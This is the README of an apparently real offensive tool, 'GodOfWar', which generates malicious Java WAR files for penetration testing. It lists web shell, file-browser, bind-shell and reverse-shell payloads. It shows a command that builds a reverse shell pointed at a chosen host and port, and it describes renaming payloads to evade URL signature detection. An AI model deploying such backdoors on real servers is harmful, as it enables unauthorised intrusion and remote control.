# GodOfWar - Malicious Java WAR builder
A command-line tool to generate war payloads for penetration testing / red teaming purposes, written in ruby.

```
                                `           
                               :hho/.`      
                              -hdddddhs/.   
                             .hddddddddy`   
                            .hddddddddh.    
                           `yddddddddh.     
                          `sddddddddh-      
                         `sddddddddd:       
                         oddddddddd:        
                        +ddddddddd/         
             `o-       /ddddddddd+          
            .y+       /dddddddddo`          
           .h/       :dddddddddd+`          
   .      .h/       `yddddddddddd+`         
  `dy/.  `y+         /ddddddddddddo`  `....`
   hMMNy+ss          `yddddddddddddo:ohmNNNs
   +MMMMMMd+-`        /dddddmmmmNNMMMMMMMMm/
   +MMMMMMMMNdo:`     +MNNNMMMMMMMMNmNMMMm.
 `oMMNosMMMmdNMMNy:/.`/omMMMMNomMMN+`/NMNo
.hMMMms+ydh+/yNNNNs:    `yNMMo+odmhydMMN+ 
/+//::m/-:////:--+ `      ./NMMMMMMMMNmds 
     +y          ` o.  .`   `:yNNmmmddddd+
    `m-            d-  hs     `ydddddddddd: 
    /h        :yy/`h  .omy: -` .hdddddddddh.
    h/       /h-.:o-    +y  -h/ -ddddddddddy
   `m`       /`o/  `    `` .`.d+ /dddddho:.`
   -m         .+dyo`     .ys` `o+`+dddd-    
   .+          .+s:///::`-.     `  ydds     
                 `` ````           +dd-     
             -:-.`        `.`      -do      
            /NNddddhysyhddddm/     `h.      
          `odo-``..:/o+:-.../h+`    -
          :-`   ---------.   `:/`    
               `NNNNNNNNNN     ``    
               `NNNNMMMMNN       
                ----hMMs-.       
                   `hMM+          ``
        `-..```  ./hMMM/ ``   `.:oh-
        .ymmddhhymMMMMMyyds.:shmMMo 
         `sNMMMMMMMMMMMMMMMNMMMMMy` 
           /NMMMMMMMMMMMMMMMMMMMm.  
            -dMMMMMMMMMMMMMMMMNm:   
             .yMMMMMMMMMMMMMMo-`    
              `oNMMMMMMMMMMNNy      
                :+NMMNNmho/-`       
                    /o/-`
                                                         

GodOfWar - Malicious Java WAR builder.
```

## Features

- Preexisting payloads. (try `-l/--list`)
    - cmd_get
    - filebrowser
    - bind_shell
    - reverse_shell_ui 
- Configurable backdoor. (try `--host/-port`)
- Control over payload name. 
  - To avoid malicious name after deployment to bypass URL name signatures.

## Installation

```
$ gem install godofwar
```

## Usage
```
$ godofwar -h 

Help menu:
   -p, --payload PAYLOAD            Generates war from one of the available payloads.
                                        (check -l/--list)
   -H, --host IP_ADDR               Local or Remote IP address for the chosen payload
                                        (used with -p/--payload)
   -P, --port PORT                  Local or Remote Port for the chosen payload
                                        (used with -p/--payload)
   -o, --output [FILE]              Output file and the deployment name.
                                        (default is the payload original name. check '-l/--list')
   -l, --list                       list all available payloads.
   -h, --help                       Show this help message.
```

### Example 

**List all payloads**
```
$ godofwar -l
├── cmd_get
│   └── Information:
│       ├── Description: Command execution via web interface
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/cmd.jsp?cmd=whoami
│       ├── References:  ["https://github.com/danielmiessler/SecLists/tree/master/Payloads/laudanum-0.8/jsp"]
│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/cmd_get
├── filebrowser
│   └── Information:
│       ├── Description: Remote file browser, upload, download, unzip files and native command execution
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/filebrowser.jsp
│       ├── References:  ["http://www.vonloesch.de/filebrowser.html"]
│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/filebrowser
├── bind_shell
│   └── Information:
│       ├── Description: TCP bind shell
│       ├── OS:          any
│       ├── Settings:    {"port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse-shell.jsp
│       ├── References:  ["Metasploit - msfvenom -p java/jsp_shell_bind_tcp"]
│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/bind_shell
├── reverse_shell_ui
│   └── Information:
│       ├── Description: TCP reverse shell with a UI to set LHOST and LPORT from browser.
│       ├── OS:          windows
│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse_shell_ui.jsp
│       ├── References:  []
│       └── Local Path:  /FULL/PATH/HERE/godofwar/payloads/reverse_shell_ui
```

**Generate payload with LHOST and LPORT**
```
godofwar -p reverse_shell_ui -H 192.168.100.10  -P 9911 -o puppy
```

## Contributing

Bug reports and pull requests are welcome on GitHub at https://github.com/[USERNAME]/godofwar.


## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

